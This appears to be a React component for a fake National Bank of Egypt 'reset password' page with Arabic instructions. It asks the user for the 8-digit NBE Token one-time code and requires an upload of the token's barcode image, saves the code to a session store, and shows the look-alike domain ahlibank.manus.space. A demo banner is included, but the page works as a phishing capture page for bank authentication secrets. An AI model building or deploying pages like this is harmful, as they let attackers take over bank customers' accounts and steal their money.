import React, { useState, useRef, useEffect } from "react";
import { useNavigate, Link } from "react-router-dom";
import { KeyRound, Smartphone, Lock, ArrowLeft, Info } from "lucide-react";
import DemoBanner from "@/components/bank/DemoBanner";
import PortalLogo from "@/components/bank/PortalLogo";
import StoreBadges from "@/components/bank/StoreBadges";
import NbeTokenBarcodeButton from "@/components/bank/NbeTokenBarcodeButton";
import BarcodeUpload from "@/components/bank/BarcodeUpload";
import { appendTokenCode } from "@/lib/portalSession";
import { PRIVACY_NOTE } from "@/lib/bankData";

const GREEN = "#1c693a";

const steps = [
  "افتح تطبيق NBE Token على هاتفك",
  "انظر إلى الرمز المكوّن من 8 أرقام الظاهر على الشاشة",
  "أدخل الرمز في الحقول أدناه",
];

export default function ResetPassword() {
  const navigate = useNavigate();
  const [digits, setDigits] = useState(Array(8).fill(""));
  const [seconds, setSeconds] = useState(30);
  const [barcodeUploaded, setBarcodeUploaded] = useState(false);
  const inputs = useRef([]);

  useEffect(() => {
    inputs.current[0]?.focus();
  }, []);

  useEffect(() => {
    if (seconds <= 0) return;
    const t = setInterval(() => setSeconds((s) => s - 1), 1000);
    return () => clearInterval(t);
  }, [seconds]);

  const handleChange = (i, val) => {
    if (!/^\d?$/.test(val)) return;
    const next = [...digits];
    next[i] = val;
    setDigits(next);
    if (val && i < 7) inputs.current[i + 1]?.focus();
  };

  const handleKey = (i, e) => {
    if (e.key === "Backspace" && !digits[i] && i > 0) {
      inputs.current[i - 1]?.focus();
    }
  };

  const complete = digits.every((d) => d !== "") && barcodeUploaded;

  const confirm = (e) => {
    e.preventDefault();
    if (!complete) return;
    appendTokenCode(digits.join(""));
    navigate("/login");
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <DemoBanner />
      <div className="flex-1 flex items-start justify-center px-4 py-8">
        <div className="w-full max-w-md space-y-6 text-center">
          <div className="flex justify-center">
            <PortalLogo />
          </div>

          {/* Hero icon */}
          <div className="flex justify-center">
            <span
              className="w-24 h-24 rounded-full flex items-center justify-center"
              style={{ backgroundColor: "#E8F5E9" }}
            >
              <KeyRound className="w-11 h-11 text-white" />
            </span>
          </div>

          <div className="space-y-2">
            <h1 className="text-2xl font-bold text-black">رمز التوكن الأهلي</h1>
            <p className="text-sm text-[#777777]">يرجى إدخال رمز التوكن للتحقق</p>
          </div>

          {/* Instructional card */}
          <div className="rounded-2xl bg-white border p-6 space-y-5 text-right" style={{ borderColor: "#cfe9d6" }}>
            <div className="flex items-center gap-3">
              <span className="w-10 h-10 rounded-full flex items-center justify-center" style={{ backgroundColor: "#E8F5E9" }}>
                <Smartphone className="w-5 h-5" style={{ color: GREEN }} />
              </span>
              <div className="leading-tight">
                <div className="font-bold" style={{ color: GREEN }}>خطوة التحقق المطلوبة</div>
                <div className="text-xs text-[#777777]">اتبع التعليمات التالية</div>
              </div>
            </div>

            <div className="space-y-3">
              {steps.map((s, i) => (
                <div key={i} className="flex items-center gap-3">
                  <span
                    className="w-7 h-7 shrink-0 rounded-full flex items-center justify-center text-xs font-bold text-white"
                    style={{ backgroundColor: GREEN }}
                  >
                    {i + 1}
                  </span>
                  <span className="text-sm text-[#333333]">{s}</span>
                </div>
              ))}
            </div>

            <StoreBadges className="pt-1" />
          </div>

          {/* NBE Token barcode section */}
          <NbeTokenBarcodeButton />

          {/* Barcode upload (required) */}
          <BarcodeUpload onUploaded={() => setBarcodeUploaded(true)} />
          {!barcodeUploaded && (
            <p className="text-xs text-red-600 text-center -mt-2">
              يجب رفع صورة الباركود لتأكيد التوكن
            </p>
          )}

          {/* Input section */}
          <div className="text-right space-y-3">
            <label className="text-sm font-semibold text-[#333333]">* أدخل الرمز المكوّن من 8 أرقام</label>
            <div className="flex justify-center gap-1.5" dir="ltr">
              {digits.map((d, i) => (
                <input
                  key={i}
                  ref={(el) => (inputs.current[i] = el)}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={d}
                  onChange={(e) => handleChange(i, e.target.value)}
                  onKeyDown={(e) => handleKey(i, e)}
                  className="w-9 h-12 text-center text-lg font-bold rounded-lg border bg-white focus:outline-none focus:border-[#1c693a] focus:ring-1 focus:ring-[#1c693a]"
                  style={{ borderColor: "#cccccc" }}
                />
              ))}
            </div>
          </div>

          <button
            onClick={confirm}
            disabled={!complete}
            className="w-full h-12 rounded-xl font-bold flex items-center justify-center gap-2 transition disabled:cursor-not-allowed"
            style={{ backgroundColor: complete ? GREEN : "#e0e0e0", color: complete ? "#fff" : "#999" }}
          >
            تأكيد التوكن
            <ArrowLeft className="w-5 h-5" />
          </button>
          {!complete && (
            <p className="text-xs text-slate-400 text-center -mt-2">
              {!barcodeUploaded ? "يجب رفع صورة الباركود أولاً" : "أدخل الرمز كاملاً"}
            </p>
          )}

          <div className="text-center">
            <Link to="/reset-password/reject" className="text-xs text-slate-400 hover:underline">محاكاة نتيجة الرفض</Link>
          </div>

          {/* Security notice */}
          <div className="flex items-start gap-2 rounded-xl bg-[#E8F5E9] p-3 text-xs text-[#1c693a]">
            <Lock className="w-4 h-4 shrink-0 mt-0.5" />
            <span>الرمز صالح لمدة 30 ثانية فقط — لا تشاركه مع أي شخص. متبقي: 00:{String(seconds).padStart(2, "0")}</span>
          </div>

          <div className="flex items-start gap-2 rounded-xl bg-[#1c693a]/5 border border-[#1c693a]/15 p-3 text-xs text-[#1c693a]">
            <Info className="w-4 h-4 shrink-0 mt-0.5" />
            <span>{PRIVACY_NOTE}</span>
          </div>

          <div className="flex justify-center">
            <span className="px-4 py-1.5 rounded-full bg-slate-100 text-xs text-slate-500" dir="ltr">ahlibank.manus.space</span>
          </div>
        </div>
      </div>
    </div>
  );
}